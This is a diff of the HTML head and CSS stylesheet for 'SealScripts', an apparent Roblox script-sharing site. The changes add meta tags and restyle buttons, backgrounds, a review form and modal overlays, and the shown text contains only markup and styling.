@@ -1,124 +1,652 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" translate="no">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>SealScripts</title>
+<link rel="icon" type="image/png" href="favicon.png">
+<link rel="apple-touch-icon" href="favicon.png">
+<meta property="og:title" content="SealScripts">
+<meta property="og:description" content="Seal scripts for Roblox">
+<meta property="og:image" content="https://autismallahakbar-source.github.io/sealer/favicon.png">
+<meta property="og:url" content="https://autismallahakbar-source.github.io/sealer/">
+<meta property="og:type" content="website">
 <style>
+/* ================= БАЗА ================= */
 *{margin:0;padding:0;box-sizing:border-box}
-body{background:#05080f;color:#e0e0e0;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;line-height:1.6;min-height:100vh;display:flex;flex-direction:column;overflow-x:hidden;background-image:radial-gradient(circle at 20% 20%,rgba(30,80,180,.12),transparent 50%),radial-gradient(circle at 80% 80%,rgba(20,60,150,.1),transparent 50%)}
-.page{display:none;min-height:100vh;flex-direction:column;justify-content:center;align-items:center;text-align:center;padding:2rem;animation:fadeIn .8s ease forwards;perspective:1200px}
-.page.active{display:flex}
-.page-content{max-width:800px;width:100%;transition:transform .25s cubic-bezier(.22,1,.36,1);transform-style:preserve-3d;will-change:transform}
-h1{font-size:4rem;font-weight:300;letter-spacing:-.02em;margin-bottom:.5rem;color:#fff;text-shadow:0 0 40px rgba(60,120,255,.4)}
-h2{font-size:1.5rem;font-weight:300;letter-spacing:.1em;margin-bottom:3rem;color:#5b7fb5;text-transform:lowercase}
-.divider{width:60px;height:2px;background:linear-gradient(90deg,transparent,#3a7bd5,transparent);border-radius:999px;margin:2rem auto;box-shadow:0 0 20px rgba(58,123,213,.6)}
+:root{
+  --bg-0:#03060d;
+  --bg-1:#05080f;
+  --blue-1:#3a7bd5;
+  --blue-2:#5ea0ff;
+  --blue-3:#1e3a5f;
+  --text:#e0e0e0;
+  --muted:#5b7fb5;
+  --smooth:cubic-bezier(.22,1,.36,1);
+}
+html,body{height:100%;overflow:hidden}
+body{
+  background:var(--bg-1);
+  color:var(--text);
+  font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
+  line-height:1.6;
+  height:100vh;
+  height:100dvh;
+  overflow:hidden;
+  position:relative;
+  background-image:
+    radial-gradient(circle at 20% 20%,rgba(30,80,180,.18),transparent 50%),
+    radial-gradient(circle at 80% 80%,rgba(20,60,150,.15),transparent 50%),
+    radial-gradient(circle at 50% 50%,rgba(58,123,213,.06),transparent 70%);
+  -webkit-font-smoothing:antialiased;
+  -moz-osx-font-smoothing:grayscale;
+  text-rendering:optimizeLegibility;
+  backface-visibility:hidden;
+}
+
+/* ============ СТАНДАРТНОЕ ВЫДЕЛЕНИЕ ТЕКСТА ============ */
+::selection{
+  background:rgba(90,160,255,.45);
+  color:#fff;
+}
+::-moz-selection{
+  background:rgba(90,160,255,.45);
+  color:#fff;
+}
+
+/* ============ ФОНОВЫЕ СЛОИ ============ */
+#bg-canvas{
+  position:fixed;inset:0;z-index:0;pointer-events:none;
+  opacity:.85;transform:translateZ(0);
+}
+.bg-vignette{
+  position:fixed;inset:0;z-index:1;pointer-events:none;
+  background:radial-gradient(circle at 50% 50%,transparent 40%,rgba(0,0,0,.55) 100%);
+  transform:translateZ(0);
+}
+.bg-scan{
+  position:fixed;inset:0;z-index:2;pointer-events:none;
+  background:repeating-linear-gradient(0deg,rgba(120,180,255,.03) 0 1px,transparent 1px 3px);
+  mix-blend-mode:overlay;opacity:.4;
+  transform:translateZ(0);
+  animation:scanMove 14s linear infinite;
+}
+@keyframes scanMove{from{background-position:0 0}to{background-position:0 60px}}
+
+/* ============ СТРАНИЦЫ ============ */
+.page{
+  display:none;position:fixed;inset:0;
+  flex-direction:column;justify-content:center;align-items:center;
+  text-align:center;padding:2rem;z-index:5;overflow-y:auto;overflow-x:hidden;
+  perspective:1200px;transform:translateZ(0);
+}
+.page.active{display:flex;animation:pageIn .9s var(--smooth) forwards}
+@keyframes pageIn{
+  from{opacity:0;transform:translateY(14px) scale(.985);filter:blur(4px)}
+  to{opacity:1;transform:translateY(0) scale(1);filter:blur(0)}
+}
+.page-content{
+  max-width:900px;width:100%;min-height:100%;
+  transition:transform .5s var(--smooth);
+  transform-style:preserve-3d;will-change:transform;
+  position:relative;display:flex;flex-direction:column;
+  align-items:center;justify-content:center;padding:1rem;
+  backface-visibility:hidden;
+}
+h1{
+  font-size:4rem;font-weight:300;letter-spacing:-.02em;margin-bottom:.5rem;
+  background:linear-gradient(180deg,#fff 0%,#a8d4ff 60%,#3a7bd5 100%);
+  -webkit-background-clip:text;background-clip:text;
+  -webkit-text-fill-color:transparent;
+}
+h2{
+  font-size:1.5rem;font-weight:300;letter-spacing:.1em;
+  margin-bottom:2rem;color:var(--muted);text-transform:lowercase;
+}
+.divider{
+  width:80px;height:2px;
+  background:linear-gradient(90deg,transparent,var(--blue-1),var(--blue-2),var(--blue-1),transparent);
+  border-radius:999px;margin:1.5rem auto;
+  box-shadow:0 0 18px rgba(58,123,213,.45);
+  position:relative;
+}
+.divider::after{
+  content:'';position:absolute;top:50%;left:50%;
+  width:8px;height:8px;border-radius:50%;background:#fff;
+  transform:translate(-50%,-50%);
+  box-shadow:0 0 14px #5ea0ff,0 0 26px #3a7bd5;
+  animation:dividerPulse 3.5s ease-in-out infinite;
+  will-change:transform,opacity;
+}
+@keyframes dividerPulse{
+  0%,100%{transform:translate(-50%,-50%) scale(1);opacity:.9}
+  50%{transform:translate(-50%,-50%) scale(1.35);opacity:.55}
+}
+
+/* ============ КНОПКИ ============ */
 .home-buttons{display:flex;flex-direction:column;align-items:center;gap:1rem}
-.btn{display:inline-block;padding:.8rem 2rem;border:1px solid #1e3a5f;border-radius:999px;color:#c9d9f0;text-decoration:none;font-size:1rem;letter-spacing:.05em;transition:all .3s ease;background:linear-gradient(180deg,rgba(30,58,95,.3),rgba(15,30,55,.5));cursor:pointer;font-family:inherit;min-width:200px}
-.btn:hover{background:linear-gradient(180deg,rgba(58,123,213,.35),rgba(30,60,110,.5));border-color:#3a7bd5;color:#fff;transform:scale(1.03);box-shadow:0 0 25px rgba(58,123,213,.4)}
-footer{margin-top:4rem;font-size:.8rem;color:#3e5a80;line-height:1.7;max-width:600px;margin-left:auto;margin-right:auto}
-footer .copyright{display:block;margin-bottom:.5rem}
+.btn{
+  display:inline-block;padding:.85rem 2.2rem;
+  border:1px solid var(--blue-3);border-radius:999px;
+  color:#c9d9f0;text-decoration:none;font-size:1rem;letter-spacing:.05em;
+  transition:
+    transform .5s var(--smooth),
+    background .5s var(--smooth),
+    border-color .5s var(--smooth),
+    color .5s var(--smooth),
+    box-shadow .5s var(--smooth);
+  background:linear-gradient(180deg,rgba(30,58,95,.3),rgba(15,30,55,.5));
+  cursor:pointer;font-family:inherit;min-width:220px;
+  position:relative;overflow:hidden;isolation:isolate;
+  transform:translateZ(0);
+}
+.btn::before{
+  content:'';position:absolute;inset:-1px;border-radius:999px;padding:1px;
+  background:linear-gradient(120deg,transparent 30%,var(--blue-2),transparent 70%);
+  -webkit-mask:linear-gradient(#000 0 0) content-box,linear-gradient(#000 0 0);
+  -webkit-mask-composite:xor;mask-composite:exclude;
+  opacity:0;transition:opacity .6s var(--smooth);z-index:-1;
+  background-size:200% 200%;
+  animation:borderFlow 5s linear infinite;
+  will-change:opacity,background-position;
+}
+@keyframes borderFlow{
+  0%{background-position:0% 50%}
+  100%{background-position:200% 50%}
+}
+.btn:hover::before{opacity:1}
+.btn:hover{
+  background:linear-gradient(180deg,rgba(58,123,213,.4),rgba(30,60,110,.6));
+  border-color:transparent;color:#fff;
+  transform:translateY(-2px) scale(1.03);
+  box-shadow:0 5px 15px rgba(58,123,213,.2),0 0 20px rgba(90,160,255,.15);
+}
+.btn:active{transform:translateY(0) scale(.99);transition-duration:.15s}
+.btn .ripple{
+  position:absolute;border-radius:50%;
+  background:radial-gradient(circle,rgba(255,255,255,.6),transparent 70%);
+  transform:scale(0);animation:ripple .8s var(--smooth) forwards;
+  pointer-events:none;z-index:0;
+  will-change:transform,opacity;
+}
+@keyframes ripple{to{transform:scale(4);opacity:0}}
+
+footer{
+  margin-top:2rem;font-size:.8rem;color:#3e5a80;
+  line-height:1.7;max-width:600px;position:relative;
+}
+footer::before{
+  content:'';display:block;width:120px;height:1px;
+  background:linear-gradient(90deg,transparent,#1e3a5f,transparent);
+  margin:0 auto 1rem;
+}
+footer .copyright{display:block;margin-bottom:.4rem;letter-spacing:.15em}
 footer .disclaimer{font-size:.7rem;color:#2a3f5c}
-.scripts-title{font-size:2rem;font-weight:300;color:#fff;margin-bottom:3rem;text-shadow:0 0 30px rgba(60,120,255,.3)}
-.script-block{margin-bottom:8rem}
-.script-block:last-of-type{margin-bottom:3rem}
-.copy-row{display:flex;align-items:center;justify-content:center;gap:.75rem;flex-wrap:wrap;margin-bottom:1rem}
-.copy-text{font-size:1rem;color:#b8cce6;padding:.9rem 1.4rem;border:1px solid #1e3a5f;border-radius:999px;background:#0a1424;user-select:all;word-break:break-all;font-family:'Courier New',monospace;max-width:90%;text-align:left;box-shadow:inset 0 0 20px rgba(30,80,180,.08)}
-.copy-btn{display:inline-flex;align-items:center;justify-content:center;width:44px;height:44px;border:1px solid #1e3a5f;border-radius:50%;background:transparent;color:#c9d9f0;font-size:1.1rem;cursor:pointer;transition:all .3s ease;flex-shrink:0}
-.copy-btn:hover{background:#132a4a;border-color:#3a7bd5;color:#fff;transform:scale(1.05);box-shadow:0 0 20px rgba(58,123,213,.4)}
-.copy-btn:active{transform:scale(.95)}
-.script-label{font-size:1.4rem;font-weight:300;color:#dce7f5;letter-spacing:.05em}
-.back-link{display:inline-block;margin-top:1rem;font-size:.9rem;color:#4a6890;text-decoration:none;transition:color .3s ease;cursor:pointer;background:none;border:none;font-family:inherit}
-.back-link:hover{color:#7aa8e0}
-.reviews-title{font-size:2rem;font-weight:300;color:#fff;margin-bottom:.5rem;text-shadow:0 0 30px rgba(60,120,255,.3)}
-.reviews-subtitle{font-size:.95rem;color:#5b7fb5;margin-bottom:3rem}
-.review-form{background:linear-gradient(180deg,rgba(15,28,50,.8),rgba(10,20,36,.9));border:1px solid #1e3a5f;border-radius:24px;padding:2.5rem 2rem;max-width:600px;width:100%;margin:0 auto 3rem;text-align:left;box-shadow:0 0 50px rgba(30,80,180,.1)}
-.form-label{display:block;font-size:.9rem;color:#6c8ab5;margin-bottom:.75rem;letter-spacing:.03em}
-.stars-input{display:flex;gap:.4rem;justify-content:center;margin-bottom:2rem;flex-direction:row-reverse}
+
+/* ============ СКРИПТЫ ============ */
+.scripts-title{
+  font-size:1.8rem;font-weight:300;color:#fff;
+  margin-bottom:1.5rem;text-shadow:0 0 22px rgba(60,120,255,.3);
+  letter-spacing:.05em;
+}
+.script-block{margin-bottom:2rem;position:relative;padding:1rem 0;width:100%}
+.script-block:last-of-type{margin-bottom:1rem}
+.copy-row{
+  display:flex;align-items:center;justify-content:center;
+  gap:.75rem;flex-wrap:wrap;margin-bottom:.75rem;
+}
+.copy-text{
+  font-size:.95rem;color:#b8cce6;
+  padding:.85rem 1.3rem;
+  border:1px solid var(--blue-3);border-radius:999px;
+  background:#0a1424;user-select:all;overflow-wrap:anywhere;
+  font-family:'Courier New',monospace;max-width:90%;text-align:left;
+  box-shadow:inset 0 0 20px rgba(30,80,180,.08);
+  transition:border-color .5s var(--smooth),box-shadow .5s var(--smooth);
+}
+.copy-text:hover{
+  border-color:var(--blue-1);
+  box-shadow:inset 0 0 20px rgba(30,80,180,.15),0 0 12px rgba(58,123,213,.1);
+}
+.copy-btn{
+  display:inline-flex;align-items:center;justify-content:center;
+  width:44px;height:44px;
+  border:1px solid var(--blue-3);border-radius:50%;
+  background:transparent;color:#c9d9f0;font-size:1.1rem;
+  cursor:pointer;
+  transition:transform .5s var(--smooth),background .5s var(--smooth),border-color .5s var(--smooth),color .5s var(--smooth),box-shadow .5s var(--smooth);
+  flex-shrink:0;transform:translateZ(0);
+}
+.copy-btn:hover{
+  background:#132a4a;border-color:var(--blue-1);color:#fff;
+  transform:scale(1.08) rotate(4deg);
+  box-shadow:0 0 12px rgba(58,123,213,.3);
+}
+.copy-btn:active{transform:scale(.95);transition-duration:.15s}
+.script-label{
+  font-size:1.2rem;font-weight:300;color:#dce7f5;letter-spacing:.05em;
+  background:linear-gradient(90deg,#fff,#a8d4ff);
+  -webkit-background-clip:text;background-clip:text;
+  -webkit-text-fill-color:transparent;
+}
+
+/* ============ КНОПКА НАЗАД ============ */
+.back-link{
+  position:fixed;top:1.25rem;right:1.25rem;z-index:120;display:none;
+  align-items:center;gap:.5rem;
+  padding:.6rem 1.2rem;font-size:.85rem;letter-spacing:.05em;
+  color:#c9d9f0;background:rgba(10,20,36,.85);
+  backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);
+  border:1px solid var(--blue-3);border-radius:999px;cursor:pointer;
+  transition:transform .5s var(--smooth),background .5s var(--smooth),border-color .5s var(--smooth),color .5s var(--smooth),box-shadow .5s var(--smooth);
+  font-family:inherit;
+  box-shadow:0 0 12px rgba(58,123,213,.08);
+  transform:translateZ(0);
+}
+.back-link.visible{display:inline-flex}
+.back-link::before{content:'←';font-size:1rem;transition:transform .5s var(--smooth)}
+.back-link:hover{
+  background:rgba(19,42,74,.95);border-color:var(--blue-1);color:#fff;
+  transform:translateX(-3px);
+  box-shadow:0 0 15px rgba(58,123,213,.25);
+}
+.back-link:hover::before{transform:translateX(-3px)}
+.back-link:active{transform:translateX(0) scale(.97);transition-duration:.15s}
+
+/* ============ ОТЗЫВЫ ============ */
+.reviews-title{
+  font-size:1.8rem;font-weight:300;color:#fff;
+  margin-bottom:.4rem;text-shadow:0 0 22px rgba(60,120,255,.3);
+}
+.reviews-subtitle{font-size:.9rem;color:var(--muted);margin-bottom:1.5rem}
+.review-form{
+  background:linear-gradient(180deg,rgba(15,28,50,.85),rgba(10,20,36,.95));
+  border:1px solid var(--blue-3);border-radius:24px;
+  padding:2rem 2rem;max-width:600px;width:100%;margin:0 auto;
+  text-align:left;
+  box-shadow:0 0 60px rgba(30,80,180,.15),0 0 120px rgba(58,123,213,.08);
+  position:relative;overflow:hidden;transform:translateZ(0);
+}
+.form-label{
+  display:block;font-size:.85rem;color:#6c8ab5;
+  margin-bottom:.5rem;letter-spacing:.03em;position:relative;
+}
+.stars-input{
+  display:flex;gap:.4rem;justify-content:center;
+  margin-bottom:1.5rem;flex-direction:row-reverse;
+}
 .stars-input input{display:none}
-.stars-input label{font-size:2.5rem;color:#1e3a5f;cursor:pointer;transition:color .2s ease,transform .2s ease;line-height:1;user-select:none}
-.stars-input label:hover,.stars-input label:hover~label,.stars-input input:checked~label{color:#5ea0ff;text-shadow:0 0 20px rgba(94,160,255,.6)}
-.stars-input label:hover{transform:scale(1.15)}
-.stars-input.error label{color:#5a1a1a;animation:shake .3s ease}
-.stars-input.error label:hover,.stars-input.error label:hover~label{color:#5ea0ff}
-@keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-4px)}75%{transform:translateX(4px)}}
-.review-textarea{width:100%;min-height:140px;padding:1rem 1.2rem;background:#0a1424;border:1px solid #1e3a5f;border-radius:16px;color:#dce7f5;font-family:inherit;font-size:.95rem;line-height:1.6;resize:vertical;transition:border-color .3s ease;margin-bottom:1.5rem}
-.review-textarea:focus{outline:none;border-color:#3a7bd5;box-shadow:0 0 20px rgba(58,123,213,.2)}
+.stars-input label{
+  font-size:2.2rem;color:#1e3a5f;cursor:pointer;
+  transition:color .45s var(--smooth),transform .45s var(--smooth),text-shadow .45s var(--smooth);
+  line-height:1;user-select:none;display:inline-block;
+}
+.stars-input label:hover,
+.stars-input label:hover~label,
+.stars-input input:checked~label{
+  color:var(--blue-2);
+  text-shadow:0 0 14px rgba(94,160,255,.5);
+}
+.stars-input label:hover{transform:scale(1.18) rotate(-6deg)}
+.stars-input.error label{color:#5a1a1a;animation:shake .4s var(--smooth)}
+.stars-input.error label:hover,
+.stars-input.error label:hover~label{color:var(--blue-2)}
+@keyframes shake{
+  0%,100%{transform:translateX(0)}
+  25%{transform:translateX(-3px)}
+  75%{transform:translateX(3px)}
+}
+.review-textarea{
+  width:100%;min-height:100px;padding:.9rem 1.1rem;
+  background:#0a1424;border:1px solid var(--blue-3);border-radius:16px;
+  color:#dce7f5;font-family:inherit;font-size:.95rem;line-height:1.6;resize:vertical;
+  transition:border-color .5s var(--smooth),box-shadow .5s var(--smooth);
+  margin-bottom:1.25rem;
+}
+.review-textarea:focus{
+  outline:none;border-color:var(--blue-1);
+  box-shadow:0 0 12px rgba(58,123,213,.15),inset 0 0 15px rgba(58,123,213,.08);
+}
 .review-textarea::placeholder{color:#3e5a80}
-.submit-btn{display:block;width:100%;padding:.9rem 2rem;border:1px solid #3a7bd5;border-radius:999px;background:linear-gradient(180deg,rgba(58,123,213,.15),rgba(30,60,110,.2));color:#7ab0ff;font-size:.95rem;letter-spacing:.05em;cursor:pointer;transition:all .3s ease;font-family:inherit}
-.submit-btn:hover{background:linear-gradient(180deg,#3a7bd5,#2a5aa0);color:#fff;transform:scale(1.02);box-shadow:0 0 30px rgba(58,123,213,.5)}
-.submit-btn:active{transform:scale(.98)}
+.submit-btn{
+  display:block;width:100%;padding:.85rem 2rem;
+  border:1px solid var(--blue-1);border-radius:999px;
+  background:linear-gradient(180deg,rgba(58,123,213,.15),rgba(30,60,110,.2));
+  color:#7ab0ff;font-size:.95rem;letter-spacing:.05em;
+  cursor:pointer;font-family:inherit;position:relative;overflow:hidden;
+  transition:transform .5s var(--smooth),background .5s var(--smooth),color .5s var(--smooth),box-shadow .5s var(--smooth);
+  transform:translateZ(0);
+}
+.submit-btn:hover{
+  background:linear-gradient(180deg,var(--blue-1),#2a5aa0);
+  color:#fff;transform:translateY(-2px) scale(1.01);
+  box-shadow:0 5px 15px rgba(58,123,213,.25),0 0 25px rgba(90,160,255,.15);
+}
+.submit-btn:active{transform:scale(.98);transition-duration:.15s}
 .submit-btn:disabled{opacity:.5;cursor:not-allowed;transform:none}
-.toast{position:fixed;bottom:30px;left:50%;transform:translateX(-50%) translateY(20px);background:#0a1424;border:1px solid #1e3a5f;color:#fff;padding:.7rem 1.5rem;border-radius:999px;font-size:.9rem;opacity:0;pointer-events:none;transition:all .35s ease;z-index:300;max-width:90%;text-align:center;box-shadow:0 0 30px rgba(58,123,213,.3)}
+
+/* ============ TOAST ============ */
+.toast{
+  position:fixed;bottom:30px;left:50%;
+  transform:translateX(-50%) translateY(20px);
+  background:rgba(10,20,36,.95);
+  backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);
+  border:1px solid var(--blue-3);color:#fff;
+  padding:.7rem 1.5rem;border-radius:999px;font-size:.9rem;
+  opacity:0;pointer-events:none;
+  transition:opacity .5s var(--smooth),transform .5s var(--smooth);
+  z-index:600;max-width:90%;text-align:center;
+  box-shadow:0 0 15px rgba(58,123,213,.15);
+  will-change:opacity,transform;
+}
 .toast.show{opacity:1;transform:translateX(-50%) translateY(0)}
-.toast.success{border-color:#3a7bd5;color:#7ab0ff}
+.toast.success{border-color:var(--blue-1);color:#7ab0ff}
 .toast.error{border-color:#c62828;color:#ef9a9a}
-.warning-overlay{position:fixed;inset:0;background:rgba(2,5,12,.9);backdrop-filter:blur(6px);-webkit-backdrop-filter:blur(6px);display:flex;align-items:center;justify-content:center;padding:2rem;opacity:0;pointer-events:none;transition:opacity .35s ease;z-index:200}
-.warning-overlay.show{opacity:1;pointer-events:auto}
-.warning-box{background:linear-gradient(180deg,rgba(15,28,50,.95),rgba(8,15,28,.98));border:1px solid #4a1a1a;border-radius:24px;max-width:560px;width:100%;padding:2.5rem 2rem;text-align:center;box-shadow:0 0 60px rgba(255,60,60,.15),0 0 100px rgba(30,80,180,.15);transform:translateY(15px) scale(.97);transition:transform .35s ease}
-.warning-overlay.show .warning-box{transform:translateY(0) scale(1)}
-.warning-icon{font-size:5.5rem;line-height:1;color:#ff3b3b;margin-bottom:1rem;display:inline-block;animation:pulse 1.6s ease-in-out infinite;text-shadow:0 0 30px rgba(255,59,59,.5)}
-@keyframes pulse{0%,100%{transform:scale(1);opacity:1}50%{transform:scale(1.08);opacity:.85}}
+
+/* ============ ОВЕРЛЕИ ============ */
+.warning-overlay,.thanks-overlay,.mad-overlay,.auth-overlay{
+  position:fixed;inset:0;
+  background:rgba(2,5,12,.9);
+  backdrop-filter:blur(8px);-webkit-backdrop-filter:blur(8px);
+  display:flex;align-items:center;justify-content:center;
+  padding:2rem;opacity:0;pointer-events:none;
+  transition:opacity .55s var(--smooth);transform:translateZ(0);
+}
+.warning-overlay{z-index:400}
+.thanks-overlay{z-index:450}
+.mad-overlay{z-index:460}
+.auth-overlay{z-index:500}
+.warning-overlay.show,.thanks-overlay.show,.mad-overlay.show,.auth-overlay.show{
+  opacity:1;pointer-events:auto;
+}
+.warning-box,.thanks-box,.mad-box,.auth-box{
+  background:linear-gradient(180deg,rgba(15,28,50,.98),rgba(8,15,28,.99));
+  border-radius:24px;max-width:560px;width:100%;
+  padding:2.5rem 2rem;text-align:center;
+  transform:translateY(15px) scale(.97);
+  transition:transform .55s var(--smooth);
+  position:relative;overflow:hidden;will-change:transform;
+}
+.warning-overlay.show .warning-box,
+.thanks-overlay.show .thanks-box,
+.mad-overlay.show .mad-box,
+.auth-overlay.show .auth-box{transform:translateY(0) scale(1)}
+.warning-box{border:1px solid #4a1a1a;box-shadow:0 0 30px rgba(255,60,60,.08),0 0 50px rgba(30,80,180,.08)}
+.thanks-box{border:1px solid var(--blue-1);box-shadow:0 0 30px rgba(58,123,213,.15)}
+.mad-box{border:1px solid #c62828;box-shadow:0 0 30px rgba(198,40,40,.12)}
+.auth-box{max-width:420px;border:1px solid var(--blue-1);box-shadow:0 0 30px rgba(58,123,213,.18)}
+
+.warning-icon{
+  font-size:5rem;line-height:1;color:#ff3b3b;
+  margin-bottom:1rem;display:inline-block;
+  animation:pulse 2.4s ease-in-out infinite;
+  text-shadow:0 0 30px rgba(255,59,59,.6);
+  will-change:transform,opacity;
+}
+@keyframes pulse{
+  0%,100%{transform:scale(1);opacity:1}
+  50%{transform:scale(1.06);opacity:.9}
+}
 .warning-title{font-size:1.5rem;font-weight:400;color:#fff;margin-bottom:1.2rem;letter-spacing:.03em}
 .warning-text{font-size:.95rem;color:#b0b0b0;line-height:1.7;margin-bottom:2rem}
 .warning-text strong{color:#ff6b6b;font-weight:500}
-.warning-btn{display:inline-block;padding:.85rem 2rem;border-radius:999px;font-size:.95rem;letter-spacing:.03em;cursor:pointer;transition:all .3s ease;font-family:inherit;background:#1a1a1a;border:1px solid #ff3b3b;color:#fff}
-.warning-btn:hover{background:#ff3b3b;color:#0a0a0a;transform:scale(1.03)}
+.warning-btn{
+  display:inline-block;padding:.85rem 2rem;border-radius:999px;
+  font-size:.95rem;letter-spacing:.03em;cursor:pointer;font-family:inherit;
+  background:#1a1a1a;border:1px solid #ff3b3b;color:#fff;
+  transition:transform .5s var(--smooth),background .5s var(--smooth),color .5s var(--smooth),box-shadow .5s var(--smooth);
+  transform:translateZ(0);
+}
+.warning-btn:hover{background:#ff3b3b;color:#0a0a0a;transform:scale(1.05);box-shadow:0 0 15px rgba(255,59,59,.25)}
+.warning-btn:active{transform:scale(.98);transition-duration:.15s}
 .warning-btn:disabled{opacity:.5;cursor:not-allowed;transform:none}
 .warning-btn:disabled:hover{background:#1a1a1a;color:#fff;transform:none}
-.thanks-overlay{position:fixed;inset:0;background:rgba(2,5,12,.9);backdrop-filter:blur(6px);-webkit-backdrop-filter:blur(6px);display:flex;align-items:center;justify-content:center;padding:2rem;opacity:0;pointer-events:none;transition:opacity .35s ease;z-index:250}
-.thanks-overlay.show{opacity:1;pointer-events:auto}
-.thanks-box{background:linear-gradient(180deg,rgba(15,28,50,.95),rgba(8,15,28,.98));border:1px solid #3a7bd5;border-radius:24px;max-width:480px;width:100%;padding:2.5rem 2rem;text-align:center;box-shadow:0 0 60px rgba(58,123,213,.3);transform:translateY(15px) scale(.97);transition:transform .35s ease}
-.thanks-overlay.show .thanks-box{transform:translateY(0) scale(1)}
-.thanks-icon{font-size:4.5rem;line-height:1;color:#3a7bd5;margin-bottom:1rem;display:inline-block;animation:pop .5s ease;text-shadow:0 0 30px rgba(58,123,213,.6)}
-@keyframes pop{0%{transform:scale(.5);opacity:0}60%{transform:scale(1.15);opacity:1}100%{transform:scale(1);opacity:1}}
+
+.thanks-icon{
+  font-size:4.5rem;line-height:1;color:var(--blue-1);
+  margin-bottom:1rem;display:inline-block;
+  text-shadow:0 0 22px rgba(58,123,213,.55);
+}
 .thanks-title{font-size:1.5rem;font-weight:400;color:#fff;margin-bottom:.8rem;letter-spacing:.03em}
 .thanks-text{font-size:.95rem;color:#b0b0b0;line-height:1.7;margin-bottom:2rem}
-.thanks-btn{display:inline-block;padding:.85rem 2rem;border-radius:999px;font-size:.95rem;letter-spacing:.03em;cursor:pointer;transition:all .3s ease;font-family:inherit;background:#0a1424;border:1px solid #3a7bd5;color:#7ab0ff}
-.thanks-btn:hover{background:#3a7bd5;color:#fff;transform:scale(1.03);box-shadow:0 0 25px rgba(58,123,213,.5)}
-.mad-overlay{position:fixed;inset:0;background:rgba(2,5,12,.9);backdrop-filter:blur(6px);-webkit-backdrop-filter:blur(6px);display:flex;align-items:center;justify-content:center;padding:2rem;opacity:0;pointer-events:none;transition:opacity .35s ease;z-index:260}
-.mad-overlay.show{opacity:1;pointer-events:auto}
-.mad-box{background:linear-gradient(180deg,rgba(15,28,50,.95),rgba(8,15,28,.98));border:1px solid #c62828;border-radius:24px;max-width:480px;width:100%;padding:2.5rem 2rem;text-align:center;box-shadow:0 0 60px rgba(198,40,40,.25);transform:translateY(15px) scale(.97);transition:transform .35s ease}
-.mad-overlay.show .mad-box{transform:translateY(0) scale(1)}
-.mad-icon{font-size:4.5rem;line-height:1;color:#ff3b3b;margin-bottom:1rem;display:inline-block;animation:pop .5s ease;font-weight:300}
+.thanks-btn{
+  display:inline-block;padding:.85rem 2rem;border-radius:999px;
+  font-size:.95rem;letter-spacing:.03em;cursor:pointer;font-family:inherit;
+  background:#0a1424;border:1px solid var(--blue-1);color:#7ab0ff;
+  transition:transform .5s var(--smooth),background .5s var(--smooth),color .5s var(--smooth),box-shadow .5s var(--smooth);
+  transform:translateZ(0);
+}
+.thanks-btn:hover{background:var(--blue-1);color:#fff;transform:scale(1.05);box-shadow:0 0 12px rgba(58,123,213,.3)}
+.thanks-btn:active{transform:scale(.98);transition-duration:.15s}
+
+.mad-icon{
+  font-size:4.5rem;line-height:1;color:#ff3b3b;
+  margin-bottom:1rem;display:inline-block;font-weight:300;
+}
 .mad-title{font-size:1.5rem;font-weight:400;color:#fff;margin-bottom:.8rem;letter-spacing:.03em}
 .mad-text{font-size:.95rem;color:#b0b0b0;line-height:1.7;margin-bottom:2rem}
-.mad-btn{display:inline-block;padding:.85rem 2rem;border-radius:999px;font-size:.95rem;letter-spacing:.03em;cursor:pointer;transition:all .3s ease;font-family:inherit;background:#0a1424;border:1px solid #ff3b3b;color:#ffb3b3}
-.mad-btn:hover{background:#ff3b3b;color:#0a0a0a;transform:scale(1.03)}
-.lang-switcher{display:none;position:fixed;top:1.25rem;right:1.25rem;z-index:150}
-.lang-switcher.visible{display:block}
-.lang-switcher select{background:#0a1424;color:#c9d9f0;border:1px solid #1e3a5f;border-radius:999px;padding:.5rem 1.1rem;font-size:.85rem;font-family:inherit;cursor:pointer;transition:all .3s ease;appearance:none;-webkit-appearance:none;padding-right:1.9rem;background-image:url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%235b7fb5' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");background-repeat:no-repeat;background-position:right .7rem center;background-size:14px}
-.lang-switcher select:hover{background-color:#132a4a;border-color:#3a7bd5;color:#fff}
-.lang-switcher select:focus{outline:none;border-color:#3a7bd5}
-@keyframes fadeIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
-@media (max-width:600px){
-.lang-switcher{top:.75rem;right:.75rem}
-.lang-switcher select{padding:.4rem .9rem;font-size:.75rem;padding-right:1.7rem;background-size:12px}
-h1{font-size:2.5rem}
-h2{font-size:1rem}
-.scripts-title{font-size:1.5rem}
-.copy-text{font-size:.75rem;padding:.7rem 1rem}
-.script-label{font-size:1.1rem}
-.script-block{margin-bottom:5rem}
-footer{font-size:.7rem}
-footer .disclaimer{font-size:.65rem}
-.warning-icon{font-size:4rem}
-.warning-title{font-size:1.2rem}
-.warning-text{font-size:.85rem}
-.warning-box{padding:2rem 1.5rem}
-.warning-btn{font-size:.85rem;padding:.75rem 1.5rem}
-.review-form{padding:1.8rem 1.2rem}
-.stars-input label{font-size:2rem}
-.reviews-title{font-size:1.5rem}
-.thanks-icon,.mad-icon{font-size:3.5rem}
-.thanks-title,.mad-title{font-size:1.2rem}
-.thanks-text,.mad-text{font-size:.85rem}
-.thanks-box,.mad-box{padding:2rem 1.5rem}
+.mad-btn{
+  display:inline-block;padding:.85rem 2rem;border-radius:999px;
+  font-size:.95rem;letter-spacing:.03em;cursor:pointer;font-family:inherit;
+  background:#0a1424;border:1px solid #ff3b3b;color:#ffb3b3;
+  transition:transform .5s var(--smooth),background .5s var(--smooth),color .5s var(--smooth);
+  transform:translateZ(0);
 }
-@media (prefers-reduced-motion:reduce){.page-content{transition:none}}
